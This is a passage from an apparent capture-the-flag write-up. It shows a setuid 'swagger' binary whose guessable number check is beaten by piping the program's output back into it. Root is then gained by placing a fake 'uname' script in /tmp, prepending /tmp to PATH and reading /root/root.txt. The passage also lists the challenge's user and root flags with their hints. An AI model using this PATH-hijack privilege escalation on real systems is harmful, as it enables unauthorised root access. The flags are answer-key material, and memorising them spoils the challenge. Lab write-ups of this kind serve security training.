  setreuid(0,0);
  puts("Nice use of the time-turner!");
  printf("This system architecture is ");
  fflush(stdout);
  system("uname -p");
  return;
}

hermonine@hogwartz-castle:/srv/time-turner$ for i in $(seq 1 6) ; do echo 123 | ./swagger ; done
Guess my number: Nope, that is not what I was thinking
I was thinking of 437290903
Guess my number: Nope, that is not what I was thinking
I was thinking of 437290903
Guess my number: Nope, that is not what I was thinking
I was thinking of 437290903
Guess my number: Nope, that is not what I was thinking
I was thinking of 437290903
Guess my number: Nope, that is not what I was thinking
I was thinking of 437290903
Guess my number: Nope, that is not what I was thinking
I was thinking of 437290903

hermonine@hogwartz-castle:/srv/time-turner$ ./swagger| grep -oE '[0-9]+' | ./swagger
1
Guess my number: Nice use of the time-turner!
This system architecture is x86_64

hermonine@hogwartz-castle:/srv/time-turner$ echo 1234 | ./swagger | tr -dc '0-9' | ./swagger 
Guess my number: Nice use of the time-turner!
This system architecture is x86_64

hermonine@hogwartz-castle:/srv/time-turner$ cd /tmp
hermonine@hogwartz-castle:/tmp$ cat > uname << EOF 
> #!/bin/bash
> cat /root/root.txt
> EOF
hermonine@hogwartz-castle:/tmp$ cat uname 
#!/bin/bash
cat /root/root.txt
hermonine@hogwartz-castle:/tmp$ chmod +x uname
hermonine@hogwartz-castle:/tmp$ export PATH=/tmp:$PATH
hermonine@hogwartz-castle:/tmp$ echo 1234 | /srv/time-turner/swagger | tr -dc '0-9' | /srv/time-turner/swagger 
Guess my number: Nice use of the time-turner!
This system architecture is RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}

```

User1.txt

Find the different user. Keep enumerating.

*RME{th3-b0Y-wHo-l1v3d-f409da6f55037fdc}*

User2.txt

She is a know it all and wants you to share her love for the metric system

*RME{p1c0-iZ-oLd-sk00l-nANo-64e977c63cb574e6}*

Root.txt

Time is tricky. Can you trick time.

*RME{M@rK-3veRy-hOur-0135d3f8ab9fd5bf}*


[[biteme]]